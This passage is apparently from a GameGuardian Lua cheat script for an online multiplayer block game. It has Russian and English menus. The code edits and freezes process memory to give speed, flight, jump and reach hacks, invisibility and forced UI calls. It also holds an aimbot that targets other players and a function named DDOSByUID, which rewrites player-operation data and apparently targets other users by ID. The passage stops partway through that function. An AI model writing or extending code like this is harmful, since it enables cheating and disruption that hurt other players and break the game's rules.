        if checknum == nil then
        if not eng1 then
  gg.toast('Обнаружены стороние символы. ВВОДИ ТОЛЬКО ЧИСЛА❗❗❗')
  else
  gg.toast('incompatible symbols detected. ENTER NUMBERS ONLY❗❗❗')
  end
else
setAirSpeed(on2323)
end
end
end
end

MenuStatus19 = '🔴'
MenuStatus20 = '🔴'
MenuStatus21 = '🔴'
--Функции скорости
function checkNumber(val)
error1488 = nil
val2 = tonumber(val)
if val == "" then
        if not eng1 then
        gg.alert('Сᴛᴩоᴋᴀ нᴇ ʍожᴇᴛ быᴛь ᴨуᴄᴛой❗','')
        else
        gg.alert('𝙎𝙩𝙧𝙞𝙣𝙜 𝙘𝙖𝙣𝙣𝙤𝙩 𝙚𝙢𝙥𝙩𝙮❗',"")
        end
        error1488 = true
        elseif not val2 then
        if not eng1 then
  gg.alert('❗Обнᴀᴩужᴇны ᴄᴛоᴩониᴇ ᴄиʍʙоᴧы. Вʙоди ᴛоᴧьᴋо чиᴄᴧᴀ.','')
  else
  gg.alert('❗𝙄𝙣𝙘𝙤𝙢𝙥𝙖𝙩𝙞𝙗𝙡𝙚 𝙨𝙮𝙢𝙗𝙤𝙡𝙨 𝙙𝙚𝙩𝙚𝙘𝙩𝙚𝙙. 𝙀𝙣𝙩𝙚𝙧 𝙣𝙪𝙢𝙗𝙚𝙧𝙨 𝙤𝙣𝙡𝙮.','')
  end
  error1488 = true
  end end

function MagicSpeed3()
if not eng1 then
input12 = gg.prompt({
            "🔹Скорость полёта『⚡🪽』\n\nВʙᴇди значение:"
        }, {
            [1] = "1"
        })
        else
        input12 = gg.prompt({
            "🔹Fly Speed『⚡🪽』\n\nEnter value:"
        }, {
            [1] = "1"
        })
        end
        if input12 then
        on2329 = input12[1]:gsub(",", ".")
checkNumber(on2329)
if error1488 then
MagicSpeed3()
do return end
end
        off667=on2329 + 0.000998
        off6677=off667 / 20
        lastFlySp=off667 / 20
clientChecker()
for i, v in pairs(t) do
    v.flags = 16
	v.address = v.address + 0x544
	v.value = off6677
	v.freeze = true
	gg.addListItems(t)
end
gg.clearResults()
gg.clearList()
end
end

function MagicSpeed5()
inputs5 = gg.prompt({
            "🔹Скорость полёта на парашюте『⚡🪽🪂』\n\nВведи значение:", "🔹Скорость падения на парашюте『⚡☄️🪂』\n\nВведи значение:"
        }, {
            [1] = "1",
            [2] = '1'
        })
        if inputs5 then
        onsp2323 = inputs5[2]:gsub(",", ".")
        onsp23232 = inputs5[1]:gsub(",", ".")
        checknumsp = tonumber(onsp2323)
        checknumsp2 = tonumber(onsp23232)
        if onsp2323 == "" and onsp23232 == '' then
        gg.toast('Строки не могут быть пустыми❗')
        elseif checknumsp == nil and checknumsp2 == nil then
  gg.toast('Обнаружены стороние символы. ВВОДИ ТОЛЬКО ЧИСЛА❗❗❗')
  else
  if checknumsp == nil or checknumsp2 == nil then
  gg.alert('❗Были обнаружены сторонние символы или была обнаружена пустая строка, будет выполнено только 1 действие', '')
  end
if checknumsp ~= nil then
        offsp232=onsp2323 + 0
        offsp2323=offsp232 * 0.8
        end
        if checknumsp2 ~= nil then
        offspe232=onsp23232 + 0
        offsp23232=offspe232 * 0.05
        end
if not Val201 then
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
gg.searchNumber("4405601298448122112", 32)
Val201v = gg.getResults(99999)
Val201 = true
end
gg.clearResults()
gg.clearList()
gg.addListItems(Val201v)
t = gg.getListItems()
gg.clearList()
for i, v in pairs(t) do
    v.flags = 16
	v.address = v.address + 0x8
	if checknumsp ~= nil then
	v.value = offsp2323
	v.freeze = true
	gg.addListItems(t)
	gg.clearList()
	if onsp2323 == '1' or onsp2323 == '1.0' then
    PValSP = '🔴'
    else
    PValSP = '🟢'..'x'..inputs5[2]
    end
	end
	if checknumsp2 ~= nil then
	v.address = v.address + 4
	v.value = offsp23232
	v.freeze = true
	gg.addListItems(t)
	gg.clearList()
	if onsp23232 == '1' or onsp23232 == '1.0'   then
    PValSP2 = '🔴'
    else
    PValSP2 = '🟢'..'x'..inputs5[1]
    end
	end
end
gg.clearResults()
gg.clearList()
end
end
end
--Конец
PValSP = '🔴'
PValSP2 = '🔴'
function SpeedMenu()
gg.clearResults()
gg.clearList()
if not eng1 then
menuSpeed = gg.multiChoice({
	[1] = '🔹Сᴋоᴩоᴄᴛь бᴇᴦᴀ『⚡👣』 ' .. MenuStatus19,
    [2] = _,
	[3] = '🔹Сᴋоᴩоᴄᴛь ᴨоᴧёᴛᴀ (𝘿𝙚𝙫)『⚡🪽』 🟡',
	[4] = _,
    [5] = '🔹Сᴋоᴩоᴄᴛь ᴨᴀᴩᴀɯюᴛᴀ『⚡🪂』 '..'S:'..PValSP2..'; F:'..PValSP,
    [6] = '🔹Сᴋоᴩоᴄᴛь в воздухе『⚡💨』 🟡'
}, Lasttl, '🔹Мᴇню ᴄᴋоᴩоᴄᴛи『⚡』')
else
menuSpeed = gg.multiChoice({
	[1] = '🔹Run Speed『⚡👣』 ' .. MenuStatus19,
    [2] = '🔹Fall Speed『⚡☄️』' .. MenuStatus20,
	[3] = '🔹Fly Speed (𝘿𝙚𝙫)『⚡🪽』 🟡',
	[4] = '🔹Game Speed『⚡🎮』' .. MenuStatus21,
    [5] = '🔹Parachute Speed『⚡🪂』 '..'S:'..PValSP2..'; F:'..PValSP,
    [6] = '🔹Air Speed『⚡💨』 🟡'
}, Lasttl, '🔹Speed Menu『⚡』')
end
if menuSpeed then
if menuSpeed[1] then 
MagicSpeed1()
end
if menuSpeed[2] then 
MagicSpeed2()
end
if menuSpeed[3] then 
MagicSpeed3()
end
if menuSpeed[4] then 
MagicSpeed4()
end
if menuSpeed[5] then 
MagicSpeed5()
end
if menuSpeed[6] then 
AirSpeed()
end
end
end

--[[	[0] = '🔹Run Speed『⚡』',
    [1] = '🔹Fall Speed『☄️⚡』',
	[2] = '🔹FlyDev Speed『🪽⚡』',
	[3] = '🔹Game Speed『🎮⚡』',
    [4] = '🔹Fall Speed In Parachute『⚡☄️🪂』',
    [5] = '🔹Fly Speed In Parachute『⚡🪂』',
}, Lasttl, '🔹Speed Menu『⚡』')]]



function setJump(val)
val=val + 0.000998
        val=val / 2.38095246
        val = val + 0.01797817
        clientChecker()
if not getJumpSet then
gg.setVisible(false)
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
gg.searchNumber('; ਽㻗',2)
gg.refineNumber(';㻗',2)
t = gg.getResults(gg.getResultsCount())
gg.clearResults()
for i,v in pairs(t) do
v.flags = 4
v.address = v.address + -6
end
jumpval11 = gg.getValues(t)
getJumpSet = true
end
gg.loadResults(jumpval11)
gg.refineNumber('100~150',4)
jumpval11 = gg.getResults(gg.getResultsCount())
jumpval12 = gg.getResults(gg.getResultsCount())
gg.clearResults()
for i,v in pairs(jumpval12) do
v.flags = 16
v.address = v.address + 4
v.value = val
v.freeze = true
gg.addListItems(jumpval12)
end
gg.clearList()
end

yeah5 = false
function JumpHeight()
gg.clearResults()
gg.clearList()
if not eng1 then
input6 = gg.prompt({
            "🔹Высота прыжка『↑↑↑』\n\nВведи значение:"
        }, {
            [1] = "1"
        })
        else
        input6 = gg.prompt({
            "🔹Jump Height『↑↑↑』\n\nEnter value:"
        }, {
            [1] = "1"
        })
        end
        if input6 then
        on2325 = input6[1]:gsub(",", ".")
  checkNumber(on2325)
if error1488 then
JumpHeight()
do return end
end
setJump(on2325)        
end
end

function ReachBlock(st)
if not wzrdrich then
wzrdrich=getPKey('BlockReachDistance','6.5~2228.228') end
if st then
tsp.blds={address=wzrdrich+4,flags=16,freeze=true,value=2228.228}
ReachBlockStatus=true
else
tsp.blds={address=wzrdrich+4,flags=16,freeze=true,value=6.5}
ReachBlockStatus=false
end
end

function UIbyID44()
if not alertUIid then
t = gg.alert('❗Желательно иметь мой модифицированный установленный common.zip с доступом ко всем UI, чтобы использовать эту функцию безопасно.\nВ противном случае, если ты введёшь ID UI которого нету в игре, то скрипт попытается вызвать этот UI и игра вылетит нахуй.','Я понял', 'Отмена')
if t then
if t == 1 then
alertUIid = true
else
do return end
end
end
end
UIbyID = gg.prompt({[1] = "🔹Вызвать по айди『📞🌠-ID🟢』\n\nВведи значение:",[2] = 'Не вызвать, а закрыть『📞🌠-ID🔴』', [3] = 'Заморозить UI(-S)『📞🌠-ID❄️』'},nil,{false,'checkbox','checkbox'})
if UIbyID then
auq2 = tostring(UIbyID[1])
if string.find(auq2,',') then
multiUI, multiUI2 = true, nil
elseif string.find(auq2,'-') then
auq1 = auq2:gsub('-','.')
if not auq1 then
gg.alert('❗Не удалось выполнить вызов по радиусу ID, потому что обнаружены стороние символы.\nПример как надо: 10-20 (10 ui не заставят себя ждать)','')
UIbyID44()
do return end
else
multiUI, multiUI2 = nil, true
auq2 = auq2:gsub('-','~')
end
else
multiUI, multiUI2 = nil, nil
auq2 = UIbyID[1]:gsub(',','.')
auq2 = tonumber(auq2)
if UIbyID[1] == '' then
gg.alert('❗Строка не может быть пуста','')
UIbyID44()
do return end
elseif not auq2 then
gg.alert('❗Обнаружены сторонние символы, вводи только числа','')
UIbyID44()
do return end
end
end
if UIbyID[2] then
notCallUI = true
end
if UIbyID[3] then
CallUIFreeze = true
end
CallToGUITool(auq2)
end
end
function CallToGUIMenu()
CallUIMenu = true
CallG = gg.choice({'🔹Вызвать по айди『📞🌠-ID』','🔹Просмотреть ID\'S『📞🌠🟢』','🔸Назад『⬅️』'},'777','t.me/MagicFromWizard')
if CallG then
if CallG == 1 then
UIbyID44()
elseif CallG == 2 then
TemplatesMenuUI()
elseif CallG == 3 then
MainMenu = false
CallUIMenu = false
aga1 = true
end
end
end

function CallToGUITool(GUIID)
--By wizard
gg.setVisible(false)
gg.clearResults()
gg.clearList()
if not j7jK then
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
gg.searchNumber(8386662888221666921,32)
j7jK = gg.getResults(1)
gg.clearResults()
end
if not multiUI and not multiUI2 then
if GUIID > 50 and GUIID ~= 112 then
qdi = '0~1'
else
qdi = '1'
end
end
if gameChange then
ggs1121 = 800000
gameChange = nil
else
ggs1121 = 200000
end
if not multiUI then
if multiUI2 then
qdi = '0~1'
end
gg.searchNumber("1~1000000X;"..qdi.."B;"..GUIID.."D::13", 4,_, gg.SIGN_EQUAL, j7jK[1].address + -ggs1121 , j7jK[1].address + ggs1121)
gg.refineNumber(GUIID,4)
j = gg.getResults(99999)
gg.clearResults()
else
j = {}
GUIID = strToList(GUIID)
for i = 1,#GUIID do
GUIID[i] = tonumber(GUIID[i])
if not GUIID[i] then
gg.alert('❗Не удалось сделать мульти вызов, вводи только числа и разделяй их запятыми для мульти вызова.','')
UIbyID44()
do return end
end
if GUIID[i] > 50 and GUIID[i] ~= 112 then
qdi = '0~1'
else
qdi = '1'
end
gg.searchNumber("1~1000000X;"..qdi.."B;"..GUIID[i].."D::13", 4,_, gg.SIGN_EQUAL, j7jK[1].address + -ggs1121 , j7jK[1].address + ggs1121)
gg.refineNumber(GUIID[i],4)
g = gg.getResults(99999)
gg.clearResults()
for i,v in pairs(g) do
table.insert(j,{['address']=v.address, ['flags']=1})
end
end
end
for i,v in pairs(j) do
v.flags = 1
v.address = v.address + -4
end
gg.loadResults(j)
gg.refineNumber(qdi,1)
j = gg.getResults(99999)
gg.clearResults()
for i,v in pairs(j) do
v.flags = 1
v.address = v.address + 8
end
gg.loadResults(j)
gg.refineNumber('0~1',1)
j = gg.getResults(99999)
if hh881j then
AutoRespawnVal = gg.getResults(99999)
gg.clearResults()
do return end
end
gg.clearResults()
for i,v in pairs(j) do
v.flags = 1
if not notCallUI then
v.value = 1
else
v.value = 0
end
v.freeze = true
gg.addListItems(j)
notCallUI = nil
if usii then
gg.sleep(100)
v.value = 0
v.freeze = true
gg.addListItems(j)
usii = nil
end
end
if not CallUIFreeze then
gg.clearList()
else
CallUIFreeze = nil
while true do
if gg.isVisible(true) then
gg.setVisible(false)
t = gg.alert('🔹Разморозить замороженный UI, чтобы вернуться в меню?『UI-❄️🔴』','Да', 'Нет')
if t then
if t == 1 then
gg.clearList()
aga1 = true
break
elseif t == 2 then
gg.setVisible(false)
end
end
end
end
end
end

function policeAlert()
a = gg.alert('🔺Скрипт обнаружил, что находишься в мини-игре Jail Break и ты являешься полицейским.\n\nУбивать узников?', '🔸Убивать','🔹Не убивать')
if a == 1 then
g1014UI = true
elseif a == 2 then
g1014UI = nil
else
policeAlert()
end
end
function setMode()
t=myGameType
if t=='1037' or t=='1027' or t=='1048' then
BasicGames1=true
end
end


function YotsuTest()
function Main()
A0={{A1,A2,A3,A4,A5,A6,A7,A8,A9,A10,A11,A12,A13,A14,A15,A16,A17,A18,A19,A20,A21,A22,A23,A24,A25,A26,A27,A28,A29,A30,A31,A32,A33,A34,A35,A36,A37,A38,A39,A40,A41,A42,A43,A44,A45,A46,A47,A48,A49,A50,A51,A52,A53,A54,A55,A56,A57,A58,A59,A60,A61,A62,A63,A64,A65,A66,A67,A68,A69,A70,A71,A72,A73,A74,A75,A76,A77,A78,A79,A80,A81,A82,A83,A84,A85,A86,A87,A88,A89,A90,A91,A92,A93,A94,A95,A96,A97,A98,A99,A},{B1,B2,B3,B4,B5,B6,B7,B8,B9,B10,B11,B12,B13,B14,B15,B16,B17,B18,B19,B20,B21,B22,B23,B24,B25,B26,B27,B28,B29,B30,B31,B32,B33,B34,B35,B36,B37,B38,B39,B40,B41,B42,B43,B44,B45,B46,B47,B48,B49,B50,B51,B52,B53,B54,B55,B56,B57,B58,B59,B60,B61,B62,B63,B64,B65,B66,B67,B68,B69,B70,B71,B72,B73,B74,B75,B76,B77,B78,B79,B80,B81,B82,B83,B84,B85,B86,B87,B88,B89,B90,B91,B92,B93,B94,B95,B96,B97,B98,B99,B},{C1,C2,C3,C4,C5,C6,C7,C8,C9,C10,C11,C12,C13,C14,C15,C16,C17,C18,C19,C20,C21,C22,C23,C24,C25,C26,C27,C28,C29,C30,C31,C32,C33,C34,C35,C36,C37,C38,C39,C40,C41,C42,C43,C44,C45,C46,C47,C48,C49,C50,C51,C52,C53,C54,C55,C56,C57,C58,C59,C60,C61,C62,C63,C64,C65,C66,C67,C68,C69,C70,C71,C72,C73,C74,C75,C76,C77,C78,C79,C80,C81,C82,C83,C84,C85,C86,C87,C88,C89,C90,C91,C92,C93,C94,C95,C96,C97,C98,C99,C},{D1,D2,D3,D4,D5,D6,D7,D8,D9,D10,D11,D12,D13,D14,D15,D16,D17,D18,D19,D20,D21,D22,D23,D24,D25,D26,D27,D28,D29,D30,D31,D32,D33,D34,D35,D36,D37,D38,D39,D40,D41,D42,D43,D44,D45,D46,D47,D48,D49,D50,D51,D52,D53,D54,D55,D56,D57,D58,D59,D60,D61,D62,D63,D64,D65,D66,D67,D68,D69,D70,D71,D72,D73,D74,D75,D76,D77,D78,D79,D80,D81,D82,D83,D84,D85,D86,D87,D88,D89,D90,D91,D92,D93,D94,D95,D96,D97,D98,D99,D},{E1,E2,E3,E4,E5,E6,E7,E8,E9,E10,E11,E12,E13,E14,E15,E16,E17,E18,E19,E20,E21,E22,E23,E24,E25,E26,E27,E28,E29,E30,E31,E32,E33,E34,E35,E36,E37,E38,E39,E40,E41,E42,E43,E44,E45,E46,E47,E48,E49,E50,E51,E52,E53,E54,E55,E56,E57,E58,E59,E60,E61,E62,E63,E64,E65,E66,E67,E68,E69,E70,E71,E72,E73,E74,E75,E76,E77,E78,E79,E80,E81,E82,E83,E84,E85,E86,E87,E88,E89,E90,E91,E92,E93,E94,E95,E96,E97,E98,E99,E},{F1,F2,F3,F4,F5,F6,F7,F8,F9,F10,F11,F12,F13,F14,F15,F16,F17,F18,F19,F20,F21,F22,F23,F24,F25,F26,F27,F28,F29,F30,F31,F32,F33,F34,F35,F36,F37,F38,F39,F40,F41,F42,F43,F44,F45,F46,F47,F48,F49,F50,F51,F52,F53,F54,F55,F56,F57,F58,F59,F60,F61,F62,F63,F64,F65,F66,F67,F68,F69,F70,F71,F72,F73,F74,F75,F76,F77,F78,F79,F80,F81,F82,F83,F84,F85,F86,F87,F88,F89,F90,F91,F92,F93,F94,F95,F96,F97,F98,F99,F},{1093567616,1127481344,1070554153,1056964608,1048576000,1065353216,1054168405,1110385664,1061158912,1128792064,1203982336,979875840,953267991,1175979008,1113336054,1253513984,999047168,1058642330,1287568416,970045207,1024458752,1232348160,7405825,1027080192,1167867904,1702232065,1191753728,16384,300,284,1049515524,1106356732,1061662228,1057887355,1058853723,1111940189,1016856576,1116995584,1061662228,1062735970}}
end


function Sv(v,rg,fg)rt={}sr(rg)sn(v[1],fg)
local r=gr(j)cr()if #r==0 then return rt end 
for iv=2,#v do for i=1,#r do 
r[i].address=r[i].address+v[iv][2]end 
local rr=gv(r)tt={}for i=1,#rr do 
if rr[i].value==v[iv][1]
then ii=#tt+1 tt[ii]={}
tt[ii].address=rr[i].address-v[iv][2]
tt[ii].flags=fg end end 
if #tt==0 then T(nv)return rt end 
r=gv(tt)
if iv==#v then rt=r return rt end 
end return rt end
function Svi(v,rg,fg)rt={}sr(rg)sn(v[1],fg)
local r=gr(j)cr()if #r==0 then T(nv)return rt end 
for iv=2,#v do for i=1,#r do 
r[i].address=r[i].address+v[iv][2]
r[i].flags=v[iv][3]end 
local rr=gv(r)tt={}for i=1,#rr do 
if rr[i].value>=v[iv][1][1] and rr[i].value<=v[iv][1][2]
then ii=#tt+1 tt[ii]={}
tt[ii].address=rr[i].address-v[iv][2]
tt[ii].flags=v[iv][3]end end 
if #tt==0 then T(nv)return rt end 
r=gv(tt)
if iv==#v then rt=r return rt end 
end return rt end
function Ed(quna1,quna2,quna3,quna4,quna5,quna6,quna7,quna8)
if #r>0 then tt={}
for i=1,#r do ii=#tt+1tt[ii]={}
tt[ii].address=r[i].address+quna1 
tt[ii].value=quna2 
tt[ii].flags=quna3
tt[ii].freeze=quna4
tt[ii].name=quna5
end 
if quna6=='1' then ad(tt)end 
if quna7=='1' then sv(tt)end 
if quna8=='1' then cl()end 
end return tt end
function Ge(quna1,quna2,quna3)
for i,v in pairs(r) do
local address=v.address
x=gv({{address=address + quna1, flags = quna2}})[quna3].value
end end
ex,sr,sn,rn,gv,gr,gl,cr,cl,ad,rl,lr,sv,V,T,iV,pr,sl=os.exit,gg.setRanges,gg.searchNumber,gg.refineNumber,gg.getValues,gg.getResults,gg.getListItems,gg.clearResults,gg.clearList,gg.addListItems,gg.removeListItems,gg.loadResults,gg.setValues,gg.setVisible,gg.toast,gg.isVisible,gg.prompt,gg.sleep
valueblock={}Main()

vonglap='Hiện tại đang có một vòng lặp, vui lòng tắt vòng lặp trước đó'
lap=0 j=603501 Nd=0 Color=1 nv='not value' inp='input?' on='|✓' off='|off'

function ChangeRadius()
TargetRadius = gg.prompt({"🔹Наводиться в радиусе блоков:\n\n🔹Значение:"
        }, {
            [1] = "10"
        },{'number'})
        if TargetRadius then
        TargetRadius = TargetRadius[1]:gsub(",", ".")
        if TargetRadius == "" then
        gg.toast('Строка не может быть пуста❗')
        else
         TargetRadius = tonumber(TargetRadius)
        if TargetRadius == nil then
  gg.toast('Обнаружены стороние символы. ВВОДИ ТОЛЬКО ЧИСЛА❗❗❗')
else
distan=TargetRadius
end
end
end
end
end

function concatenateTables(t1, t2)
  for i = 1, #t2 do
    t1[#t1 + 1] = t2[i]
  end
  return t1
end
h118 = nil
function aimbot2()
function lap1()
aimbotst=true
dis = TargetRadius
  linh={{"80","4"},{"-660","16"},{"-664","16"},{"-668","16"},{"-188","64"},{"612","32"},{"396","4"}}
  iii1=1
  table.insert(linh,{'1172','4'})
  
  if myGameType=='1026' then
  table.insert(linh,{'1052','4'})
  iii1=iii1+1
  end
r={{address=Mag6[1].address+0x1f4,flags=4}}
   player={}   
    for i=1,#linh do
      player[i]={["address"]=r[1]["address"]+linh[i][1],["flags"]=linh[i][2]}
      Main10['player#'..i]={["address"]=r[1]["address"]+linh[i][1],["flags"]=linh[i][2]}
    end
     me={}
     me[1]={["address"]=r[1]["address"]+"-688",["flags"]="16"}
     me[2]={["address"]=r[1]["address"]+"-692",["flags"]="16"}
     end
function lap2()
r=getAllPlayers(not staim.st.dteam)
for i=1,#r do
r[i].flags=4
r[i].address=r[i].address+0x1f4
end
   --Sv({"1127481344",{"300","-284"},{"0","-300"}},"4","4")
    if #r==0 then aga1 = true WizardMain(UI1,'Живых врагов не найдено! ',3000,1,{1,0,1}) len=70 antiCrash2() gg.addListItems(ar123)aimbotst1,aimbotst=nil,nil if TPKiller then blink(false) end do return end end WizardMain(UI1,#r..'',2000,1,{1,0,0})
    for i=1,#r do
        for ii=1,#linh do 
            t=#player+1
            Main10['player#'..t]={["flags"]=linh[ii][2],["address"]=r[i]["address"]+linh[ii][1]}
            player[t]={["flags"]=linh[ii][2],["address"]=r[i]["address"]+linh[ii][1]}
        end
    end
    credits1337 = true
    end
    lap1()
    lap2()

end 
           

function Sv(v,rg,fg)
  local  rt={}
    gg.setRanges(rg)
    gg.searchNumber(v[1],fg)
    r=gg.getResults(j)
    cr()
    if #r=='0' then 
      r=rt gg.toast(nv)
      return rt 
    end 
    for iv=2,#v do 
      if #v[iv]=="2" then
        for i=1,#r do 
          r[i]["address"]=r[i]["address"]+v[iv][2]
        end
        local rr=gg.getValues(r)
        tt={}
        for i=1,#rr do 
          if rr[i]["value"]==v[iv][1]then 
            ii=#tt+1 
            tt[ii]={}
            tt[ii]["address"]=rr[i]["address"]-v[iv][2]
            tt[ii]["flags"]=fg 
          end
        end
      else 
        for i=1,#r do 
          r[i]["address"]=r[i]["address"]+v[iv][2]r[i]["flags"]=v[iv][3]
        end 
        local rr=gg.getValues(r)
        tt={}
        if #v[iv]=="4" then 
          if v[iv][4]=="1" then 
            if type(v[iv][1])=="table" then 
              for i=1,#rr do 
                if rr[i]["value"]>=tonumber(v[iv][1][1]) and rr[i]["value"]<=tonumber(v[iv][1][2])
                  then 
                  ii=#tt+1 
                  tt[ii]={["address"]=rr[i]["address"]-v[iv][2],["flags"]=v[iv][3]}
                end
              end
            else
              for i=1,#rr do
                if rr[i]["value"]==v[iv][1]then 
                  ii=#tt+1 
                  tt[ii]={["address"]=rr[i]["address"]-v[iv][2],["flags"]=v[iv][3]}
                end 
              end
            end
            else
              if type(v[iv][1])=="table" then 
                for i=1,#rr do 
                  if rr[i]["value"]>=tonumber(v[iv][1][1]) and rr[i]["value"]<=tonumber(v[iv][1][2])
                    then
                  else 
                    ii=#tt+1 
                    tt[ii]={["address"]=rr[i]["address"]-v[iv][2],["flags"]=v[iv][3]}
                  end
                end
              else
                for i=1,#rr do
                  if rr[i]["value"]~=tonumber(v[iv][1])then 
                    ii=#tt+1
                    tt[ii]={["address"]=rr[i]["address"]-v[iv][2],["flags"]=v[iv][3]}
                  end
                end
              end
            end
          end
          if #v[iv]=="3" then
            if type(v[iv][1])=="table" then
              for i=1,#rr do
                if rr[i]["value"]>=tonumber(v[iv][1][1]) and rr[i]["value"]<=tonumber(v[iv][1][2])
                  then 
                  ii=#tt+1 
                  tt[ii]={["address"]=rr[i]["address"]-v[iv][2],["flags"]=v[iv][3]}
                end 
              end
            else 
            for i=1,#rr do
              if rr[i]["value"]==v[iv][1]
                then 
                ii=#tt+1
                tt[ii]={["address"]=rr[i]["address"]-v[iv][2],["flags"]=v[iv][3]}
              end
            end
          end
        end
      end
      if #tt=='0' then 
        r=rt gg.toast(nv)
        return rt
      end 
      r=gg.getValues(tt)
      if iv==#v then 
        rt=r 
        return rt
      end 
    end 
    r=rt 
    return 
    rt 
end
function main828()
    grl,ex,sr,sn,rn,gv,gr,gl,cr,cl,ad,rl,lr,sv,V,T,iV,pr,sl,valueblock,j,nv,tb,nb,cb,txt=gg["getRangesList"],os.exit,gg["setRanges"],gg["searchNumber"],gg["refineNumber"],gg["getValues"],gg["getResults"],gg["getListItems"],gg["clearResults"],gg["clearList"],gg["addListItems"],gg["removeListItems"],gg["loadResults"],gg["setValues"],gg["setVisible"],gg["toast"],gg["isVisible"],gg["prompt"],gg["sleep"],{},99999,'notvalue','table','number','checkbox','text'
    linhquna,nd,cli,showhp,bypass=1,0,0,0,1
end

function AimBot()
jkh1 = 10
if not AimKiller and not TargetRadius then
TargetRadius = gg.prompt({"🔹Наводиться в радиусе блоков:\n\n🔹Значение:" --[[,'🔹Бить в радиусе блоков(если авто кликер включен)']]
        }, {
            [1] = "10"
        },{'number'}) 
        else
        TargetRadius={[1]='99999'}
        end     
        if TargetRadius then
        TargetRadius = TargetRadius[1]:gsub(",", ".")
        if TargetRadius == "" then
        gg.toast('Строка не может быть пуста❗')
        onaim1 = nil
        else
         TargetRadius = tonumber(TargetRadius)
         
        if not TargetRadius then
  gg.toast('Обнаружены стороние символы. ВВОДИ ТОЛЬКО ЧИСЛА❗❗❗')
  onaim1 = nil
  else
main828()
aimbotst1=true
aimbot2()
end
end
end
do return end end


c776 = 0

function GetWizardValue()
if not WizardValue then
gg.setVisible(false)gg.clearResults()gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)gg.searchNumber(4611686018435055617,32)if gg.getResultsCount()==0 then gg.searchNumber(4611686022208749569,32) end WizardValue=gg.getResults(1)gg.clearResults() Main10['CurrentAim']={address=WizardValue[1].address-412,flags=4} end
end

function ClickTP1()gg.clearResults()gg.clearList()getBlockZYZ=true gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)gg.searchNumber(4611686018435055617,32)if gg.getResultsCount()==0 then gg.searchNumber(4611686022208749569,32) end WizardValue=gg.getResults(1)gg.clearResults()Main10['ClickTP']={address=WizardValue[1].address-12,flags=4,freeze=true,value=0}gg.searchNumber('4785074604081000~4785074604081500',32,_,_,WizardValue[1].address+-140000,WizardValue[1].address+140000)t=gg.getResults(1)gg.clearResults()Main10['BlockX'],Main10['BlockY'],Main10['BlockZ']={address=t[1].address+0xD8,flags=16},{address=t[1].address+0xDC,flags=16},{address=t[1].address+0xE0,flags=16}end

function FlyDev(speed,j)
clientChecker()
if not j then
v1 = 1
v2 = 0.50001525879
FlyDevST=true
else
FlyDevST=false
v1 = 0
v2 = 0
end
for i, v in pairs(t) do
        v.flags = 16
        v.address = v.address + -200
		v.value = v1
		v.freeze = true
		gg.addListItems(t)
		v.address = v.address + 0x544
		v.value = v2
		v.freeze = true
		gg.addListItems(t)
		if speed then
		v.address = v.address + -8
		v.value = speed
		v.freeze = true
		gg.addListItems(t)
		end
end
gg.clearResults()
gg.clearList()
end



function MineReset()gg.addListItems({{address=Main10.X.address,flags=16,freeze=true,value=536.4},{address=Main10.Y.address,flags=16,freeze=true,value=1.16},{address=Main10.Z.address,flags=16,freeze=true,value=-136.6},{address=Main10.X.address+12,flags=16,freeze=true,value=537},{address=Main10.X.address+16,flags=16,freeze=true,value=2.96},{address=Main10.X.address+20,flags=16,freeze=true,value=-136}})gg.clearList() end

function FlyParachute()
Main10['View'].value=1
gg.addListItems({{address=Mag1[1].address+-200,flags=16,freeze=true,value=1},{address=Mag1[1].address+0x544,flags=16,freeze=true,value=0.50001525879},{address=Mag1[1].address+0x54A,flags=1,freeze=true,value=1},{address=Mag1[1].address+0x604,flags=4,freeze=true,value=3000},{address=Mag1[1].address+0x578,flags=1,freeze=true,value=1},{address=Mag1[1].address+-184,flags=2,freeze=true,value=0},Main10['View']})
gg.clearList()
parachuteST=true
if not FlyDevST then
FlyDevST=true
end
end

function Invisible()
clientChecker()
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
gg.searchNumber('4 611 686 018 435 055 617',32)
Magi1 = gg.getResults(99999)
gg.clearResults()
for i,v in pairs(t) do
v.flags = 16
v.address = v.address + -160
gg.addListItems(t)
v1x = gg.getValues(gg.getListItems())
gg.clearList()
v.address = v.address + 4
gg.addListItems(t)
v1y = gg.getValues(gg.getListItems())
gg.clearList()
v.address = v.address + 4
gg.addListItems(t)
v1z = gg.getValues(gg.getListItems())
gg.clearList()
end
gg.sleep(200)
for i,v in pairs(Magi1) do
v.flags = 1
v.address = v.address + -96
v.value = 1
v.freeze = true
gg.addListItems(Magi1)
gg.clearList()
end
gg.sleep(200)
Teleport('null','-505','null')
on1 = true
blink()
gg.sleep(200)
Teleport(v1y[1].value,v1z[1].value,v1x[1].value)
gg.addListItems(Mag1)
t = gg.getListItems()
for i,v in pairs(t) do
v.flags = 16
v.address = v.address + 0x600
v.value = '0.5'
v.freeze = true
gg.addListItems(t)
end
gg.clearResults()
gg.clearList()
end

function TNTTAGConfig()
MagicSpeed1()
MagicSpeed3()
FlyDev()
JetPack()
ReachBlock(true)
on27 = true
NoDelay()
TNTTAGMoveState()
FastBreak()
end

function DDOSByUID()
gg.setVisible(false)gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)gg.clearResults()gg.searchNumber(';PlayerOperation',2)t=gg.getResults(99999)gg.refineNumber(';n',2)g16=gg.getResults(99999)gg.clearResults()gg.loadResults(t)gg.refineNumber(';P',2)t=gg.getResults(99999)gg.clearResults()for penis=1,#t do t[penis].address=t[penis].address+0x48 t[penis].flags=4 end gg.loadResults(t)gg.refineNumber(257,4)t=gg.getResults(99999)gg.clearResults()for penis=1,#t do tsp['v1'..penis]={address=t[penis].address+12,flags=2,freeze=true,value=0}tsp['v2'..penis]={address=t[penis].address,flags=4,freeze=true,value=1}tsp['v3'..penis]={address=t[penis].address+0xa0,flags=16,freeze=true,value=0}tsp['v4'..penis]={address=t[penis].address+0xa4,flags=16,freeze=true,value=0}tsp['v5'..penis]={address=t[penis].address+0xa8,flags=16,freeze=true,value=0}tsp['v6'..penis]={address=t[penis].address+0xa6,flags=16,freeze=true,value=0}end spisok228 = {}d=0 for i = 1,16 do
